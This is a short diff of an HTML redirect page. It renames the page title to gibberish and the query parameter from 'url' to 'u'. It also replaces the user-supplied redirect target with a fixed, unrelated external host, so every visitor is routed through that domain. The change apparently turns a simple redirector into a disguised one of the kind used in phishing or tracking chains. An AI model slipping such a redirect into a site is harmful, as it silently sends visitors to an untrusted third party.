@@ -2,19 +2,19 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Redirect</title>
+  <title>adjkhdfk</title>
 </head>
 <body>
 
 <script>
   const params = new URLSearchParams(window.location.search);
-  const url = params.get("url");
+  const url = params.get("u");
 
   if (!url) {
     document.body.innerText = "Missing URL";
   } else {
     try {
-      const target = new URL(url);
+      const target = new URL("https://s-barndybrigh.brinova.co.uk/fl-folther/?qry=" + url);
 
       if (target.protocol === "http:" || target.protocol === "https:") {
         window.location.replace(target.href);
